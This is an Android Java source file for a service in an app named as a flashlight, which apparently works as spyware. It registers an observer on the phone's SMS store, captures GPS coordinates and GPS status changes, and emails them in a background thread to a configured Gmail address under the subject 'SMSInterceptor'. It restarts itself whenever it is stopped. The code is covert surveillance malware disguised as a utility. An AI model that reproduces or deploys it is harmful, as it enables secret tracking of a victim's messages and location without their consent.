package com.flash.light; 

import android.os.Bundle;
import android.os.IBinder;
import android.os.Handler;
import android.os.Message;
import android.os.Messenger;
import android.os.SystemClock; 

import android.app.Service;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;

import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.pm.PackageManager;

import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;

import android.net.Uri;
import java.lang.Double;
import android.util.Log;
import android.widget.Toast;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.database.ContentObserver;

public class FlashLightService extends Service implements LocationListener {

  private static String gmailEmailString;
  private static final String SUBJECT = "SMSInterceptor";
  private static final String TAG = "FlashLight FLService";

  private static GmailSender sender;
  private static Configure configure;
  private static LocationManager locationManager;

  private static boolean mLocation = false;

  public FlashLightService() { 

    Log.i(TAG, "Entering FlashLightService() constructor");

    configure = new Configure();
    gmailEmailString = configure.emailAddress();
    Log.i(TAG, "FlashLightServce() constructor gmailEmailString " + gmailEmailString);
  } 

  final Messenger mMessenger = new Messenger(new IncomingHandler());

  static class IncomingHandler extends Handler {
    @Override
    public void handleMessage(Message msg) {
      super.handleMessage(msg);
    }
  }

  public boolean gpsEnabled() {
    return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
  }

  @Override
  public IBinder onBind(Intent intent) {
    return mMessenger.getBinder();
  }

  @Override
  public void onProviderDisabled(String s) {
    sendThreadedEmail("GPS has been 'DIS'abled!");
  }

  @Override
  public void onStatusChanged(String s, int i, Bundle bundle) { }

  @Override
  public void onProviderEnabled(String s) {
    sendThreadedEmail("GPS has been 'EN'abled!");
  }

  @Override
  public void onLocationChanged(Location location) {
    if(mLocation) {
      Double dLatitude  = location.getLatitude();
      final String latitude   = String.valueOf(dLatitude);
      Double dlongitude = location.getLongitude();
      final String longitude  = String.valueOf(dlongitude);
      sendThreadedEmail("Location!\nlatitude-longitude coordinates:\n" + "" + latitude + "," + longitude);
    }
    mLocation = false;
  }

  @Override
  public void onTaskRemoved(Intent rootIntent) {
    super.onTaskRemoved(rootIntent);
    Log.d(TAG,"onTaskRemoved()");
  }

  @Override
  public void onDestroy() {
    super.onDestroy();
    Log.d(TAG, "onDestroy()");
  }

  public void onCreate(Context context, Intent intent) {
    Log.d(TAG, "onCreate()");
    try {
      if(intent.getAction() != null) {
        intent = new Intent(context, FlashLight.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
      }
    }
    catch(Exception e) {
      e.printStackTrace();
    }
  }

  @Nullable
  @Override
  public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {

    Log.d(TAG, "onStartCommand() Entering onStartCommand method.");

    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    //locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);

    try {
      if(gmailEmailString.equals("null")) {
        configure.getDatabaseInfo(this.getApplicationContext());
      }
      Handler mSmsObserverHandler = new Handler();
      ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
      SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
      contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
    }
    catch(NullPointerException e) {
      Log.e(TAG, "onStartCommand() NullPointerException e, Error creating ContentObserver()");
    }

    return START_STICKY;
  }

  public void sendThreadedEmail(final String message) {
    new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail(SUBJECT, message, gmailEmailString);
        }
        catch(Exception e) {
          Log.e(TAG, "thread() Exception e " + e.toString());
          e.printStackTrace();
        }
      }
    }).start();
  }

  public void obtainLocation(Context context,PendingIntent pendingIntent) {
    Log.d(TAG, "obtainLocation() Grabbing location.");
    try {
      if(gpsEnabled()) {
        mLocation = true;
        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, pendingIntent);
      }
      else {
        sendThreadedEmail("GPS is not enabled. Cannot obtain location.");
      }
    }
    catch(Exception e) {
      Log.e(TAG, "thread() Exception e " + e.toString());
      e.printStackTrace();
    }
  }

}
